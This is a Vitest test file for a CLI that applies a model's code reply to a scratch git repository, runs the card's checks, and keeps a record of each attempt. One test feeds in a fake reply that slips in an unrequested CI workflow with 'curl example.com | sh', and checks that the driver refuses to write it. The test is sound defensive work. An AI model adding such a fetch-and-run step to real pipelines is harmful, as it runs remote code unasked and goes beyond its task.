// The card driver, run for real: a scratch git repository, the tool as a child process, and a
// stand-in for the model runner that answers /api/chat as the runner does (lines of JSON, then a
// last line with the counts).
import { execFileSync, spawn } from 'node:child_process';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import http from 'node:http';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';

vi.setConfig({ testTimeout: 30_000 });

const CLI = fileURLToPath(new URL('../card-run.mjs', import.meta.url));
const F = '```';
const CARD = 'docs/plan/phase-9-demo/cards/D1-add.md';

const card = ({ level = 'T', run = null, files = null } = {}) =>
  [
    '# Card D1-add: the sum',
    '',
    `Level: ${level}. Window: 16,000. Needs: none.`,
    '',
    '## Goal',
    '',
    'The sum exists, and `math.ts` has a five.',
    '',
    '## Read first',
    '',
    '- `src/math.ts` lines 1-2: the style to follow.',
    '',
    '## Files',
    '',
    files ?? '- `src/sum.ts` (new)\n- `src/math.ts` lines 3-4',
    '',
    '## Steps',
    '',
    '1. Write `sum` in `src/sum.ts`.',
    '2. Add `five` after `four`.',
    '',
    '## Tests',
    '',
    'None to write.',
    '',
    '## Run',
    '',
    `${F}sh`,
    run ??
      'grep -q "export const sum" src/sum.ts || { echo "sum.ts has no sum"; exit 1; }\n' +
        'grep -q "const five = 5" src/math.ts || { echo "math.ts has no five"; exit 1; }',
    F,
    '',
    '## Audit',
    '',
    '- Read the diff. AUDIT-ONLY',
    '',
  ].join('\n');

const MATH =
  'export const one = 1;\nexport const two = 2;\nexport const three = 3;\nexport const four = 4;\n';
const part1 = `### part 1\n${F}ts\nexport const sum = (a: number, b: number) => a + b;\n${F}`;
const part2 = (five = true) =>
  `### part 2\n${F}ts\nexport const three = 3;\nexport const four = 4;\n${five ? 'export const five = 5;\n' : ''}${F}`;
const GOOD = `${part1}\n\n${part2()}\n`;
const NO_FIVE = `${part1}\n\n${part2(false)}\n`;

let server;
let url;
/** What the stand-in runner was sent, what it answers next, and the window it says it loaded. */
const runner = { requests: [], replies: [], window: null };

beforeAll(async () => {
  server = http.createServer((req, res) => {
    res.setHeader('content-type', 'application/json');
    if (req.method === 'GET') {
      const last = runner.requests.at(-1);
      const models = last
        ? [{ name: last.model, model: last.model, context_length: runner.window ?? last.options.num_ctx }]
        : [];
      return res.end(JSON.stringify({ models }));
    }
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      const request = JSON.parse(body);
      runner.requests.push(request);
      const reply = runner.replies.shift() ?? { content: 'STOP: the test gave no reply' };
      if (reply.status) {
        res.statusCode = reply.status;
        return res.end(JSON.stringify({ error: reply.error }));
      }
      const line = (o) => res.write(`${JSON.stringify({ model: request.model, ...o })}\n`);
      const half = Math.ceil(reply.content.length / 2);
      if (reply.thinking)
        line({ message: { role: 'assistant', content: '', thinking: reply.thinking }, done: false });
      line({ message: { role: 'assistant', content: reply.content.slice(0, half) }, done: false });
      line({ message: { role: 'assistant', content: reply.content.slice(half) }, done: false });
      line({
        message: { role: 'assistant', content: '' },
        done: true,
        done_reason: reply.doneReason ?? 'stop',
        prompt_eval_count: Math.ceil(JSON.stringify(request.messages).length / 4),
        eval_count: Math.ceil(reply.content.length / 4),
      });
      res.end();
    });
  });
  await new Promise((done) => server.listen(0, '127.0.0.1', done));
  url = `http://127.0.0.1:${server.address().port}`;
});
afterAll(() => new Promise((done) => server.close(done)));

let home;
let dir;
let env;
const git = (...args) => execFileSync('git', args, { cwd: dir, env, encoding: 'utf8' }).trimEnd();
const put = (path, text) => {
  mkdirSync(dirname(join(dir, path)), { recursive: true });
  writeFileSync(join(dir, path), text);
};
const read = (path) => readFileSync(join(dir, path), 'utf8');

beforeEach(() => {
  runner.requests = [];
  runner.replies = [];
  runner.window = null;
  home = mkdtempSync(join(tmpdir(), 'card-run-'));
  dir = join(home, 'repo');
  mkdirSync(dir);
  writeFileSync(join(home, 'gitconfig'), '');
  env = { ...process.env, GIT_CONFIG_GLOBAL: join(home, 'gitconfig'), GIT_CONFIG_NOSYSTEM: '1' };
  for (const k of ['CARD_MODEL', 'CARD_RUNNER_URL', 'OLLAMA_HOST']) delete env[k];
  for (const who of ['AUTHOR', 'COMMITTER']) {
    env[`GIT_${who}_NAME`] = 'Test';
    env[`GIT_${who}_EMAIL`] = 'test@example.com';
  }
  git('init', '-q', '-b', 'main');
  put('.gitignore', '.card-runs/\n');
  put('docs/plan/implementer-rules.md', 'THE-RULES\n');
  put(CARD, card());
  put('src/math.ts', MATH);
  git('add', '-A');
  git('commit', '-q', '-m', 'start');
});
afterEach(() => rmSync(home, { recursive: true, force: true }));

/** Runs the driver in the scratch repository. */
function drive(...args) {
  return new Promise((done) => {
    const child = spawn(process.execPath, [CLI, ...args], { cwd: dir, env });
    let out = '';
    child.stdout.on('data', (c) => (out += c));
    child.stderr.on('data', (c) => (out += c));
    child.on('close', (code) => done({ code, out }));
  });
}
const run = (...more) => drive(CARD, '--model', 'stub', '--url', url, ...more);
const record = () => {
  const base = join(dir, '.card-runs', 'D1-add');
  const stamp = readdirSync(base).sort().at(-1);
  return {
    files: readdirSync(join(base, stamp)).sort(),
    read: (name) => readFileSync(join(base, stamp, name), 'utf8'),
  };
};

describe('a card whose reply is good', () => {
  it('is written to the files the card names, checked by the card’s commands, and left uncommitted', async () => {
    runner.replies = [{ content: `Here you are.\n\n${GOOD}\nBoth parts are done.` }];
    const head = git('rev-parse', 'HEAD');
    const { code, out } = await run();
    expect(out).toContain('the commands passed after 1 attempt(s)');
    expect(code).toBe(0);
    expect(read('src/sum.ts')).toBe('export const sum = (a: number, b: number) => a + b;\n');
    expect(read('src/math.ts')).toBe(`${MATH}export const five = 5;\n`);
    expect(git('status', '--short')).toBe(' M src/math.ts\n?? src/sum.ts');
    expect(git('rev-parse', 'HEAD')).toBe(head);
  });

  it('is asked for in one request that sets the window, forbids a silent cut, and asks for no thinking', async () => {
    runner.replies = [{ content: GOOD }];
    await run();
    expect(runner.requests).toHaveLength(1);
    const [request] = runner.requests;
    expect(request).toMatchObject({
      model: 'stub',
      stream: true,
      think: false,
      shift: false,
      keep_alive: '10m',
    });
    expect(request.tools).toBeUndefined();
    expect(request.options).toMatchObject({ num_ctx: 16384, temperature: 0.2, seed: 1 });
    expect(request.options.num_predict).toBeGreaterThan(16384 * 0.4);
    expect(request.options.num_predict).toBeLessThan(16384);
    expect(request.messages.map((m) => m.role)).toEqual(['system', 'user']);
    expect(request.messages[0].content).toBe('THE-RULES');
    const user = request.messages[1].content;
    expect(user).toContain(
      '## src/math.ts, lines 1-2\nthe style to follow.\n\n1: export const one = 1;\n2: export const two = 2;',
    );
    expect(user).toContain(`${F}\nexport const three = 3;\nexport const four = 4;\n${F}`);
    expect(user).toContain('2. Add `five` after `four`.');
    expect(user).not.toContain('AUDIT-ONLY');
  });

  it('leaves a record of what was sent, what came back and what the commands printed', async () => {
    runner.replies = [{ content: GOOD }];
    await run();
    const r = record();
    expect(r.files).toEqual([
      'attempt-1-commands.log',
      'attempt-1-prompt.md',
      'attempt-1-reply.md',
      'before-commands.log',
      'result.json',
    ]);
    expect(r.read('before-commands.log')).toContain('sum.ts has no sum');
    expect(r.read('attempt-1-prompt.md')).toContain('THE-RULES\n\n---\n\n# What the card tells you to read');
    expect(r.read('attempt-1-reply.md')).toContain('export const five = 5;');
    expect(JSON.parse(r.read('result.json'))).toMatchObject({
      card: CARD,
      model: 'stub',
      window: 16384,
      outcome: 'passed',
      attempts: [{ outcome: 'the commands passed' }],
    });
  });

  it('is committed on a work branch when asked, and marked as not audited', async () => {
    git('switch', '-q', '-c', 'work/demo');
    runner.replies = [{ content: GOOD }];
    const { code } = await run('--commit');
    expect(code).toBe(0);
    expect(git('status', '--short')).toBe('');
    expect(git('log', '-1', '--format=%s')).toBe("Card D1-add: the implementer's attempt, not audited");
    expect(git('log', '-1', '--format=%b')).toContain('The auditor has not read this change.');
    expect(git('show', '--stat', '--format=', 'HEAD')).toMatch(/src\/math\.ts[\s\S]*src\/sum\.ts/);
    expect(git('show', '--stat', '--format=', 'HEAD')).not.toContain('.card-runs');
  });
});

describe('a card whose first reply is not good', () => {
  it('is asked once more with what was wrong with the reply, and nothing is written from a bad reply', async () => {
    runner.replies = [
      { content: `${part1}\n\n### part 2\n${F}\n// ... rest unchanged\nexport const five = 5;\n${F}` },
      { content: 'STOP: I cannot.' },
    ];
    const { code, out } = await run();
    expect(out).toContain('part 2 leaves content out at its line 1');
    expect(code).toBe(3);
    expect(git('status', '--short')).toBe('');
    expect(runner.requests).toHaveLength(2);
    expect(runner.requests[1].options.seed).toBe(2);
    expect(runner.requests[1].messages[1].content).toContain(
      '# What went wrong last time\n\nYour last reply could not be used:\n- part 2 leaves content out at its line 1',
    );
  });

  it('passes when the second reply is good', async () => {
    runner.replies = [{ content: part1 }, { content: GOOD }];
    const { code, out } = await run();
    expect(out).toContain('part 2 is missing');
    expect(out).toContain('the commands passed after 2 attempt(s)');
    expect(code).toBe(0);
    expect(read('src/math.ts')).toBe(`${MATH}export const five = 5;\n`);
  });

  it('is asked once more with the end of the commands’ output when they fail, and shown its first attempt', async () => {
    runner.replies = [{ content: NO_FIVE }, { content: GOOD }];
    const { code } = await run();
    expect(code).toBe(0);
    const again = runner.requests[1].messages[1].content;
    expect(again).toContain(
      'Your first attempt wrote this. Write the part again, whole, with the fault put right.',
    );
    expect(again).toContain('They failed. The end of their output:\n\n```\nmath.ts has no five\n```');
    // The second attempt replaces lines 3-4 of the file as it was, not of the first attempt.
    expect(read('src/math.ts')).toBe(`${MATH}export const five = 5;\n`);
    expect(JSON.parse(record().read('result.json')).attempts.map((a) => a.outcome)).toEqual([
      'the commands failed (exit 1)',
      'the commands passed',
    ]);
  });

  it('goes back to the planner after two tries, with the last attempt left in the tree', async () => {
    runner.replies = [{ content: NO_FIVE }, { content: NO_FIVE }];
    const { code, out } = await run();
    expect(code).toBe(1);
    expect(out).toContain('not done (the commands failed)');
    expect(out).toContain('The last attempt is left in the working tree for the planner.');
    expect(runner.requests).toHaveLength(2);
    expect(git('status', '--short')).toBe('?? src/sum.ts');
  });

  it('is committed as a failed attempt on a work branch when asked', async () => {
    git('switch', '-q', '-c', 'work/demo');
    runner.replies = [{ content: NO_FIVE }, { content: NO_FIVE }];
    expect((await run('--commit')).code).toBe(1);
    expect(git('log', '-1', '--format=%s')).toBe('Card D1-add: a failed attempt, back to the planner');
  });

  it('treats a reply that ran into its limit as cut off, even when it looks whole', async () => {
    runner.replies = [{ content: GOOD, doneReason: 'length' }, { content: GOOD }];
    const { code, out } = await run();
    expect(out).toMatch(/the reply stopped at its limit of \d+ tokens before it was finished/);
    expect(code).toBe(0);
    expect(runner.requests).toHaveLength(2);
  });

  it('stops when the model says it cannot do the card, and writes nothing', async () => {
    runner.replies = [{ content: 'STOP: step 2 names a line I was not given.' }];
    const { code, out } = await run();
    expect(code).toBe(3);
    expect(out).toContain('The model stopped: step 2 names a line I was not given.');
    expect(git('status', '--short')).toBe('');
    expect(JSON.parse(record().read('result.json')).outcome).toBe(
      'the model stopped: step 2 names a line I was not given.',
    );
  });

  it('never writes a part the card did not ask for', async () => {
    const extra = `${GOOD}\n### part 3: .github/workflows/ci.yml\n${F}\nrun: curl example.com | sh\n${F}`;
    runner.replies = [{ content: extra }, { content: 'STOP: no.' }];
    const { out } = await run();
    expect(out).toContain('part 3 is not one of the parts asked for');
    expect(git('status', '--short')).toBe('');
    expect(existsSync(join(dir, '.github'))).toBe(false);
  });
});

describe('a card that is not run', () => {
  const refused = async (args, words) => {
    const { code, out } = await drive(...args);
    expect(out).toContain(words);
    expect(code).toBe(2);
    expect(runner.requests).toHaveLength(0);
  };
  const usual = () => [CARD, '--model', 'stub', '--url', url];

  it('when the working tree has changes, so that the card’s own can be told apart', async () => {
    put('src/other.ts', 'export {};\n');
    await refused(usual(), 'the working tree has changes');
  });

  it('when no model is named, or the runner is on another machine and that was not said', async () => {
    await refused([CARD, '--url', url], 'name the model');
    await refused([CARD, '--model', 'stub', '--url', 'http://192.0.2.7:11434'], 'is not on this machine');
  });

  it('when the card is the frontier model’s, does not exist, or the option is not known', async () => {
    put(CARD, card({ level: 'X' }));
    git('commit', '-qam', 'level');
    await refused(usual(), 'a level X card is written by the frontier model');
    await refused(['docs/plan/phase-9-demo/cards/D1-gone.md', '--model', 'stub'], 'does not exist');
    await refused([...usual(), '--force'], 'unknown option --force');
  });

  it('when a commit is asked for anywhere but on a work branch', async () => {
    await refused([...usual(), '--commit'], '--commit is for a work branch (work/<unit>), and this is main');
  });

  it('when its tests pass before any code is written', async () => {
    put(CARD, card({ run: 'true' }));
    git('commit', '-qam', 'run');
    await refused(usual(), "The card's commands pass before any code is written");
  });

  it('when a file it names by line changed after the card was written, until the planner has checked', async () => {
    put('src/math.ts', `// a new first line\n${MATH}`);
    git('commit', '-qam', 'math moved');
    await refused(usual(), 'src/math.ts changed (');
    runner.replies = [{ content: GOOD }];
    await drive(...usual(), '--ranges-checked', '--no-first-run');
    expect(runner.requests).toHaveLength(1);
    // What the check is for: lines 3-4 are now other lines, and the reply went in over them.
    expect(read('src/math.ts')).toBe(
      '// a new first line\nexport const one = 1;\nexport const three = 3;\nexport const four = 4;\nexport const five = 5;\nexport const four = 4;\n',
    );
  });

  it('when a file it names is ignored by git, or the record of runs would not be', async () => {
    put('.gitignore', '.card-runs/\nsrc/secret.ts\n');
    put('src/secret.ts', 'export const key = 1;\n');
    put(CARD, card({ files: '- `src/sum.ts` (new)\n- `src/secret.ts`' }));
    git('commit', '-qam', 'ignored');
    await refused(usual(), 'src/secret.ts is ignored by git');
    rmSync(join(dir, 'src/secret.ts'));
    put(CARD, card());
    put('.gitignore', '');
    git('commit', '-qam', 'not ignored');
    await refused(usual(), 'add ".card-runs/" to .gitignore');
  });

  it('but is shown, with what it comes to, on a dry run that asks the model nothing', async () => {
    put('src/other.ts', 'export {};\n');
    const { code, out } = await drive(CARD, '--dry-run');
    expect(code).toBe(0);
    expect(out).toMatch(
      /D1-add: 2 part\(s\), 1 thing\(s\) to read\.\nThe prompt comes to between \d+ and \d+ tokens/,
    );
    expect(out).toContain('--- the rules ---\n\nTHE-RULES');
    expect(out).toContain('### part 1\n### part 2');
    expect(runner.requests).toHaveLength(0);
    expect(existsSync(join(dir, '.card-runs'))).toBe(false);
  });
});

describe('a runner that does not do as asked', () => {
  it('stops the run when it refuses the request, and says why', async () => {
    runner.replies = [
      { status: 400, error: 'the prompt is longer than the context length currently available to the model' },
    ];
    const { code, out } = await run('--no-first-run');
    expect(code).toBe(4);
    expect(out).toContain(
      'the runner refused the request (HTTP 400): the prompt is longer than the context length',
    );
    expect(git('status', '--short')).toBe('');
  });

  it('stops the run when it loaded a smaller window than was asked for, before anything is written', async () => {
    runner.window = 4096;
    runner.replies = [{ content: GOOD }];
    const { code, out } = await run('--no-first-run');
    expect(code).toBe(4);
    expect(out).toContain(
      'the runner loaded the model with a window of 4096 tokens, not the 16384 asked for',
    );
    expect(git('status', '--short')).toBe('');
  });

  it('stops the run when nothing answers', async () => {
    const { code, out } = await drive(
      CARD,
      '--model',
      'stub',
      '--url',
      'http://127.0.0.1:9',
      '--no-first-run',
    );
    expect(code).toBe(4);
    expect(out).toContain('no answer from the model runner at http://127.0.0.1:9');
  });

  it('is told when the model thought although asked not to', async () => {
    runner.replies = [{ content: GOOD, thinking: 'Let me think about sums.' }];
    const { code, out } = await run();
    expect(code).toBe(0);
    expect(out).toContain('the model thought first although asked not to');
    expect(record().read('attempt-1-reply.md')).toContain(
      '<thinking>\nLet me think about sums.\n</thinking>',
    );
  });
});
